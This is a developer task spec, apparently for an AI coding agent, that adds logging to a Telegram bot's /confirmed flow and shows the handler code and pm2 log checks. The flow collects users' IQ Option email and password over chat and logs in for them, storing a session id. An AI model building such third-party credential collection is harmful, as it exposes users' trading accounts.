# Add logging to /confirmed flow

## IMPORTANT: Merge master first

```bash
git checkout master && git pull origin master && git checkout -b claude/confirmed-logging
```

---

## Problem

The `/confirmed` command handler and its 3-step follow-up flow have **zero logging**. When users report "no response", we can't tell if:
- The command handler never fired
- The reply failed silently
- The follow-up flow broke at a specific step

## Changes

### 1. Add logging to command handler

**File:** `src/bot.ts` — `bot.command('confirmed', ...)` handler at line 3659

Add after the handler starts (before `await ctx.reply`):

```typescript
console.log(`[confirmed] user ${ctx.from!.id} started /confirmed flow`);
```

Full updated handler:
```typescript
bot.command('confirmed', async ctx => {
    const chatId = ctx.chat!.id;
    console.log(`[confirmed] user ${ctx.from!.id} started /confirmed flow`);
    if (!getUser(ctx.from!.id)) saveUser({ telegram_id: ctx.from!.id, ssid: '' });
    connectSessions.set(chatId, { step: 'confirmed_user_id' });
    await ctx.reply(
        '🟢 *You\'ve been pre-approved*\n\n' +
        'Step 1: Send your IQ Option User ID.\n' +
        '_(The number under your profile name in the IQ Option app)_',
        { parse_mode: 'Markdown' }
    );
});
```

### 2. Add logging to each follow-up step

**File:** `src/bot.ts` — text handler at line 4493

Add logs to each `confirmed_*` step:

**At confirmed_user_id** (after the `/^\d{6,12}$/` validation passes, before `saveUserIqUserId`):
```typescript
console.log(`[confirmed] user ${ctx.from!.id} submitted User ID: ${userId}`);
```

**At confirmed_email** (when step is matched):
```typescript
console.log(`[confirmed] user ${ctx.from!.id} submitted email`);
```

**At confirmed_password** — log both the attempt and the result:
```typescript
console.log(`[confirmed] user ${ctx.from!.id} attempting login`);
// ... after login result:
// (inside the try block, after successful ssid)
console.log(`[confirmed] user ${ctx.from!.id} login SUCCESS`);
// (in the catch block)
console.log(`[confirmed] user ${ctx.from!.id} login FAILED: ${errMsg}`);
```

---

## Verification

After deployment, check PM2 logs:
```bash
pm2 logs iqbot-v3-bot --lines 50 --nostream | grep "\[confirmed\]"
```

Expected output when a user uses `/confirmed`:
```
[confirmed] user 1234567890 started /confirmed flow
[confirmed] user 1234567890 submitted User ID: 182511307
[confirmed] user 1234567890 submitted email
[confirmed] user 1234567890 attempting login
[confirmed] user 1234567890 login SUCCESS
```

If any step is missing, we know exactly where the flow breaks.
